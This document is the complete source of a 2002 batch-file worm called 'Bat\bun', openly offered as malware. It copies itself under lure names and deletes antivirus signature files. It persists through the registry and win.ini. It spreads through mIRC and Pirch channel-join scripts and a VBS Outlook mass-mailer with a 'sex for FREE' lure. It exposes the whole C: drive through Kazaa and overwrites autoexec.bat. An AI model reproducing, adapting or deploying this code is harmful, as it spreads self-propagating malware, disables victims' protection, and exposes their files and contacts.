:Bat\bun
:by adious
:written on 26\8\02
cls
@echo off
ctty nul

:copyself
if not exist c:\windows\bun.bat copy %0 c:\windows\bun.bat
if not exist c:\windows\boygirl.bat copy %0 c:\windows\boygirl.bat
if not exist c:\windows\hooker.bat copy %0 c:\windows\hooker.bat
if not exist c:\windows\win32.bat copy %0 c:\windows\win32.bat
if not exist c:\bun.bat copy %0 c:\bun.bat
if not exist c:\windows\system\sexXX09.EXE.bat copy %0 c:\windows\system\sexXX09.EXE.bat

:aav
if exist c:\bun.bat del c:\programme\norton~1\s32integ.dll
if exist c:\bun.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\bun.bat del c:\programme\mcafee\scan.dat
if exist c:\bun.bat del c:\tbavw95\tbscan.sig
if exist c:\bun.bat del c:\tbav\tbav.dat
if exist c:\bun.bat del c:\programme\tbav\tbav.dat
if exist c:\bun.bat del c:\programme\avpersonal\antivir.vdf

:registervir

echo REGEDIT4>payload.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>payload.reg
echo "msg"="c:\bun.bat">>payload.reg
regedit /s payload.reg

:Irc_werm

echo [script]>3.bat
echo n0=on 1:JOIN:#:{ >>3.bat
echo n1= /if ( nick == $me ) { halt } >>3.bat
echo n2= /.dcc send $nick c:\bun.bat >>3.bat
echo n3=} >>3.bat
if exist c:\mirc\mirc.ini copy 3.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy 3.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy 3.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy 3.bat c:\progra~1\mirc32\script.ini
del 3.bat

:kazaa
echo REGEDIT4>kazaa.reg
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>kazaa.reg
echo "DisableSharing"=dword:00000000>>kazaa.reg
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>kazaa.reg
echo "Dir0"="012345:c:\\">>kazaa.reg
regedit /s kazaa.reg

:massmailer

echo.on error resume next >c:\windows\system\donkey.vbs
echo dim a,b,c,d,e >>c:\windows\system\donkey.vbs
echo set a = Wscript.CreateObject("Wscript.Shell") >>c:\windows\system\donkey.vbs
echo set b = CreateObject("Outlook.Application") >>c:\windows\system\donkey.vbs
echo set c = b.GetNameSpace("MAPI") >>c:\windows\system\donkey.vbs
echo for y = 1 To c.AddressLists.Count >>c:\windows\system\donkey.vbs
echo set d = c.AddressLists(y) >>c:\windows\system\donkey.vbs
echo x = 1 >>c:\windows\system\donkey.vbs
echo set e = b.CreateItem(0) >>c:\windows\system\donkey.vbs
echo for o = 1 To d.AddressEntries.Count >>c:\windows\system\donkey.vbs
echo f = d.AddressEntries(x) >>c:\windows\system\donkey.vbs
echo e.Recipients.Add f >>c:\windows\system\donkey.vbs
echo x = x + 1 >>c:\windows\system\donkey.vbs
echo next >>c:\windows\system\donkey.vbs
echo e.Subject = "sex for FREE" >>c:\windows\system\donkey.vbs
echo e.Body = "Hi!hope you like this...you'll get 600+ sex pictures..for free..just run this attachment.." >>c:\windows\system\donkey.vbs
echo e.Attachments.Add ("c:\windows\system\sexXX09.EXE.bat") >>c:\windows\system\donkey.vbs
echo e.DeleteAfterSubmit = False >>c:\windows\system\donkey.vbs
echo e.Send >>c:\windows\system\donkey.vbs
echo f = "" >>c:\windows\system\donkey.vbs
echo next >>c:\windows\system\donkey.vbs
start c:\windows\system\donkey.vbs

:resident

echo [windows]>residency
echo load=c:\bun.bat>>residency
echo run=>>residency
echo NullPort=None>>residency
echo.>>residency
copy residency + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del residency

:pirchworm

del c:\pirch98\events.ini
echo [Levels]>pirch
echo Enabled=1>>pirch
echo Count=6>>pirch
echo Level1=000-Unknowns>>pirch
echo 000-UnknownsEnabled=1>>pirch
echo Level2=100-Level 100>>pirch
echo 100-Level 100Enabled=1>>pirch
echo Level3=200-Level 200>>pirch
echo 200-Level 200Enabled=1>>pirch
echo Level4=300-Level 300>>pirch
echo 300-Level 300Enabled=1>>pirch
echo Level5=400-Level 400>>pirch
echo 400-Level 400Enabled=1>>pirch
echo Level6=500-Level 500>>pirch
echo 500-Level 500Enabled=1>>pirch
echo.>>pirch
echo [000-Unknowns]>>pirch
echo User1=*!*@*>>pirch
echo UserCount=1>>pirch
echo Event1=ON JOIN:#:/dcc send $nick c:\bun.bat>>pirch
echo EventCount=1>>pirch
echo.>>pirch
echo [100-Level 100]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [200-Level 200]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [300-Level 300]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [400-Level 400]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [500-Level 500]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
move pirch c:\pirch98\events.ini
del pirch


:payload
del c:\autoexec.bat
echo @echo off >c:\autoexec.bat
echo echo 000000000000000000000000 >>c:\autoexec.bat
echo echo Hi!! >>c:\autoexec.bat
echo echo This is a friendly massage that BAT\bun has Wormz into your >>c:\autoexec.bat
echo echo comp!! Nothing has been changed in this system... >>c:\autoexec.bat
echo echo by adious [rRlf] >>c:\autoeexec.bat
echo echo 00000000000000000000000000000 >>c:\autoexec.bat
echo echo http:\\rrlf.de >>c:\autoexec.bat
echo echo pause >>c:\autoexec.bat